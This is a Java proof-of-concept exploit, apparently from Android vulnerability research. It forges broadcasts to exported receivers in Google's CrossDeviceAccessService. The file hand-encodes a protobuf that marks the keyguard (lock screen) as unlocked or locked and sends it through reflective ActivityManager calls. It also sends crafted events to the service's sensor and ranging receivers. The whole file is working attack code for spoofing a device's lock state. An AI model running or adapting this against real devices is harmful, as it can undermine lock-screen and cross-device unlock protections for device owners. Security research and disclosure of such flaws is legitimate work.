import android.content.Intent;
import android.os.Bundle;
import java.lang.reflect.Method;

public class KeyguardForge {
    public static void main(String[] args) {
        try {
            System.out.println("[*] CrossDeviceAccessService KeyguardEventReceiver Forge PoC");
            System.out.println("[*] Sending forged keyguard state broadcast...");

            // Build protobuf manually: CrossDeviceAccessServiceKeyguardEvent
            // Field 1: is_keyguard_locked (bool) = false → 08 00
            // Field 2: update_timestamp (Timestamp message)
            //   Timestamp.seconds (int64, field 1) = current epoch seconds

            long epochSeconds = System.currentTimeMillis() / 1000;
            System.out.println("[*] Timestamp: " + epochSeconds);

            // Encode timestamp seconds as varint
            byte[] tsVarint = encodeVarint(epochSeconds);
            // Timestamp inner message: field 1 (tag 0x08) + varint
            byte[] tsInner = new byte[1 + tsVarint.length];
            tsInner[0] = 0x08; // field 1, wire type 0 (varint)
            System.arraycopy(tsVarint, 0, tsInner, 1, tsVarint.length);

            // Full protobuf:
            // 08 00 (field 1 = false)
            // 12 XX (field 2, length-delimited, length XX)
            // [tsInner bytes]
            byte[] proto = new byte[2 + 1 + 1 + tsInner.length];
            proto[0] = 0x08; // field 1 tag
            proto[1] = 0x00; // false
            proto[2] = 0x12; // field 2 tag (length-delimited)
            proto[3] = (byte) tsInner.length; // length
            System.arraycopy(tsInner, 0, proto, 4, tsInner.length);

            System.out.print("[*] Protobuf bytes: ");
            for (byte b : proto) {
                System.out.printf("%02x ", b);
            }
            System.out.println();

            // Test 1: Send broadcast with is_keyguard_locked = FALSE (unlocked)
            sendKeyguardBroadcast(proto, "UNLOCKED (is_keyguard_locked=false)");

            Thread.sleep(2000);

            // Test 2: Send broadcast with is_keyguard_locked = TRUE (locked)
            proto[1] = 0x01; // true
            sendKeyguardBroadcast(proto, "LOCKED (is_keyguard_locked=true)");

            Thread.sleep(2000);

            // Test 3: Also test SensorEventReceiver
            System.out.println("\n[*] Testing SensorEventReceiver (exported, no permission)...");
            Intent sensorIntent = new Intent();
            sensorIntent.setAction("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_SENSOR_EVENT");
            sensorIntent.setClassName("com.google.android.crossdeviceaccessservice",
                "com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.SensorEventReceiver");
            sensorIntent.putExtra("crossdeviceaccessservice.sensor_event_data", new byte[]{0x08, 0x01});
            sensorIntent.addFlags(0x00000020);
            broadcastIntent(sensorIntent);
            System.out.println("[+] SensorEvent broadcast sent");

            Thread.sleep(1000);

            // Test 4: RangingCapabilitiesEventReceiver
            System.out.println("[*] Testing RangingCapabilitiesEventReceiver (exported, no permission)...");
            Intent rangingIntent = new Intent();
            rangingIntent.setAction("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_RANGING_CAPABILITIES_EVENT");
            rangingIntent.setClassName("com.google.android.crossdeviceaccessservice",
                "com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.RangingCapabilitiesEventReceiver");
            rangingIntent.putExtra("crossdeviceaccessservice.ranging_capabilities_event_data", new byte[]{0x08, 0x01});
            rangingIntent.addFlags(0x00000020);
            broadcastIntent(rangingIntent);
            System.out.println("[+] RangingCapabilities broadcast sent");

            System.out.println("\n[*] Done. Check logcat for processing evidence.");

        } catch (Exception e) {
            System.out.println("[-] Error: " + e.getMessage());
            e.printStackTrace();
        }
    }

    static void sendKeyguardBroadcast(byte[] protoBytes, String label) throws Exception {
        System.out.println("[*] Sending keyguard broadcast: " + label);

        Intent intent = new Intent();
        intent.setAction("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_KEYGUARD_STATE_CHANGED_EVENT");
        // Set explicit component to wake up the receiver
        intent.setClassName("com.google.android.crossdeviceaccessservice",
            "com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.KeyguardEventReceiver");
        intent.putExtra("crossdeviceaccessservice.keyguard_event_data", protoBytes);
        // Add FLAG_INCLUDE_STOPPED_PACKAGES (0x00000020)
        intent.addFlags(0x00000020);

        broadcastIntent(intent);
        System.out.println("[+] Broadcast sent: " + label);
    }

    static void broadcastIntent(Intent intent) throws Exception {
        // Get IActivityManager via ActivityManager.getService()
        Class<?> amClass = Class.forName("android.app.ActivityManager");
        Method getService = amClass.getMethod("getService");
        Object am = getService.invoke(null);

        // Call broadcastIntentWithFeature
        // int broadcastIntentWithFeature(IApplicationThread caller, String callingFeatureId,
        //   Intent intent, String resolvedType, IIntentReceiver resultTo,
        //   int resultCode, String resultData, Bundle resultExtras,
        //   String[] requiredPermissions, String[] excludedPermissions,
        //   String[] excludedPackages, int appOp,
        //   Bundle bOptions, boolean serialized, boolean sticky, int userId)

        // Try different method signatures for broadcastIntent
        Method[] methods = am.getClass().getMethods();
        Method broadcastMethod = null;
        for (Method m : methods) {
            if (m.getName().equals("broadcastIntentWithFeature")) {
                broadcastMethod = m;
                break;
            }
        }

        if (broadcastMethod == null) {
            // Fallback: use broadcastIntent
            for (Method m : methods) {
                if (m.getName().equals("broadcastIntent")) {
                    broadcastMethod = m;
                    break;
                }
            }
        }

        if (broadcastMethod != null) {
            System.out.println("[*] Using method: " + broadcastMethod.getName() + " params=" + broadcastMethod.getParameterCount());
            Class<?>[] paramTypes = broadcastMethod.getParameterTypes();
            Object[] params = new Object[paramTypes.length];

            for (int i = 0; i < paramTypes.length; i++) {
                if (paramTypes[i] == Intent.class) {
                    params[i] = intent;
                } else if (paramTypes[i] == int.class) {
                    // userId = 0 for the last int param, -1 for appOp, 0 for resultCode
                    if (i == paramTypes.length - 1) {
                        params[i] = 0; // userId
                    } else {
                        params[i] = -1; // appOp or resultCode
                    }
                } else if (paramTypes[i] == boolean.class) {
                    params[i] = false;
                } else {
                    params[i] = null;
                }
            }

            Object result = broadcastMethod.invoke(am, params);
            System.out.println("[*] Broadcast result: " + result);
        } else {
            System.out.println("[-] No broadcast method found, trying 'am' command...");
            // Fallback: use Runtime.exec with am command
            // But am doesn't support byte array extras, so this won't work
            System.out.println("[-] Cannot send byte array via am command");
        }
    }

    static byte[] encodeVarint(long value) {
        // Count bytes needed
        int size = 0;
        long tmp = value;
        do {
            size++;
            tmp >>>= 7;
        } while (tmp != 0);

        byte[] result = new byte[size];
        int i = 0;
        while (value > 0x7F) {
            result[i++] = (byte) ((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        result[i] = (byte) value;
        return result;
    }
}
